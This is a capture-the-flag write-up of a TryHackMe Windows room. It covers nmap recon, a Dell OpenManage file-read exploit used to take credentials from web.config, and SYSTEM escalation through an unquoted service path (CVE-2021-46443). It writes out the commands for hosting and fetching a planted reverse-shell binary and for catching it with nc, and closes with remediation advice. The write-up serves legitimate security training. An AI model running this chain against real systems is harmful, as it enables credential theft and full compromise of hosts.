# Hack Smarter Security Report: Try Hack Me - Medium Difficulty

## Enumeration and Reconnaissance

I performed a ping sweep against the target IP to verify connectivity and gather OS information via TTL analysis. The TTL value of 126 indicated a Windows-based system.

```
ping -c 1 $IP
```

![image](./img/2026-10-05_19-37.png)

## Port Discovery

Conducted a comprehensive port scan using Nmap to identify all open ports and services running on the target.

```
nmap -p- --open -sS --min-rate 4000 -n -Pn -vvv $IP -oG allPorts
```

The scan revealed FTP, HTTP, and RXMon services, confirming this is not an Active Directory environment since no LDAP, Kerberos, domain, or RPC services were detected.

![image](./img/2026-10-05_19-41.png)

## Services and Versions Port Enumeration

Targeted service and version detection was performed on critical ports:

```
nmap -p21,22,80,1311,3389 -sCV $IP -oN targeted
```

The results confirmed the presence of FTP, HTTP, and additional services comprising the attack surface.

![image](./img/2026-10-05_19-44.png)

## FTP Anonymous Access

Anonymous access to the FTP service was successfully established without credentials. Upon reviewing downloaded files including metadata and strings analysis, no immediately valuable information was identified.

![image](./img/2026-10-05_19-45.png)

## Web Testing

Port 80 hosts an HTTP service. Various vulnerability categories were tested including SQL injection, XSS, and directory fuzzing; however, the page is simple and does not interact with any API or database.

![image](./img/2026-10-05_19-46.png)

## Dell OMSA OpenManage

Port 1311 runs a DELL iDRAC service accessed via HTTPS. Attempts to authenticate with common credentials failed. This is notable since such management interfaces typically should not be exposed on the attack surface.

![image](./img/2026-10-05_19-49.png)

Further investigation revealed documentation indicating version 9.4.0 of the Server Administrator, which showed interesting configuration data.

![image](./img/2026-10-05_19-52.png)

Searchsploit was consulted for the identified version:

```
searchsploit 9.4.0 Server Administrator
```

![image](./img/2026-10-05_19-55.png)

An exploit was found enabling arbitrary file reading via a script. The module `windows/webapps/49750.py` was identified for further analysis.

![image](./img/2026-10-05_19-56.png)

However, initial attempts to utilize this exploit failed as it requires Python 2, which is no longer maintained. An alternative approach was sought.

![image](./img/2026-10-05_20-00.png)

## File Discovery: web.config

The objective was to locate credentials stored on Windows systems. The `web.config` file, an XML-based configuration used by .NET Framework applications and IIS servers, was identified as a potential source for SQL credentials or SSH user credentials.

The standard path is typically:
- `C:\inetpub\wwwroot\Web_site_name\web.config`
- `C:\inetpub\wwwroot\web.config`

In this instance, the website name was identified as `hacksmartersec` based on Nmap scan output.

![image](./img/2026-10-05_20-11.png)

The `web.config` file at `C:\inetpub\wwwroot\hacksmartersec\web.config` contained credentials for the user **tyler**.

![image](./img/2026-10-05_20-12.png)

Successfully connected via SSH using the obtained credentials:

```
ssh tyler@$IP
```

![image](./img/2026-10-05_20-14.png)

## Privilege Escalation Enumeration

Enumerated permissions and groups but found no immediately interesting configurations. Detailed system information was gathered:

```
whoami /all
```

![image](./img/2026-10-05_20-16.png)

Attempted to use WinPEAS but the antivirus permitted execution, so PrivEscCheck was utilized instead. The script was downloaded from the GitHub repository:

```
https://github.com/itm4n/PrivescCheck
```

Downloaded the script via Python HTTP server:

```
python3 -m http.server 80
```

```
curl http://<your_ip>/PrivescCheck.ps1 -o Privesc.ps1
```

![image](./img/2026-10-05_20-22.png)

## Privilege Escalation Execution

Initialized PowerShell and executed the PrivEscCheck script:

```
powershell
.\Privesc.ps1; Invoke-PrivescCheck -Extended
```

![image](./img/2026-10-05_20-24.png)

While the script ran, findings severity was monitored. Findings can be categorized as INFO or VULNERABLE.

![image](./img/2026-10-05_20-25.png)

![image](./img/2026-10-05_20-28.png)

Looking for vulnerabilities classified as medium or high severity.

And indeed, a highly vulnerable service was identified: **spoofer-scheduler**.

![image](./img/2026-10-05_20-30.png)

The spoofer service runs version 1.4.6, which is known to have an Unquoted Service Path vulnerability (CVE-2021-46443). Since the service path does not use proper quotation marks, a local user can escalate privileges from local access to SYSTEM level.

![image](./img/2026-10-05_20-38.png)

## Reverse Shell Deployment

Located a repository providing a reverse shell script for exploitation. Modified the script to include the attacker's IP address.

![image](./img/2026-10-05_20-46.png)

Compiled the Nim script with the service name `spoofer-scheduler.exe`:

```
nim c -d:mingw --app:gui -o:spoofer-scheduler.exe rev_shell.nim
```

![image](./img/2026-10-05_20-50.png)

## Service Interruption and File Retrieval

Attempted to replace the original service file but lacked sufficient permissions. Stopped the service:

```
sc stop spoofer-scheduler
```

![image](./img/2026-10-05_20-54.png)

Successfully downloaded the compiled executable:

```
curl http://$IP/spoofer-scheduler.exe -o spoofer-scheduler.exe
```

![image](./img/2026-10-05_20-55.png)

It worked.

## Shell Execution

First, I activated a listener on port 8080 to receive the shell:

```
nc -nvlp 8080
```

![image](./img/2026-10-05_20-56.png)

And then activated spoofer-scheduler:

```
sc start spoofer-scheduler
```

![image](./img/2026-10-05_20-57.png)

However, after a few seconds we lost the shell. So I had to be quick.

![image](./img/2026-10-05_21-00.png)

## Target Enumeration

Wanted to get the targets that this group will attack later, so I just made a type in the file:

```
type C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt
```

![image](./img/2026-10-05_21-03.png)

We got it.

## Remediation Recommendations

For real-life testing scenarios, it is essential to check the versions of the services used. This was the principal exploit chain followed: detecting services used and their versions, which were vulnerable and had associated CVEs, making them easy to exploit.

Key recommendations:
- Regularly update all service versions to patched releases
- Implement network segmentation to limit exposure of management interfaces
- Conduct frequent asset discovery and version scanning
- Apply principle of least privilege for service accounts
- Monitor for unquoted service paths and other common misconfigurations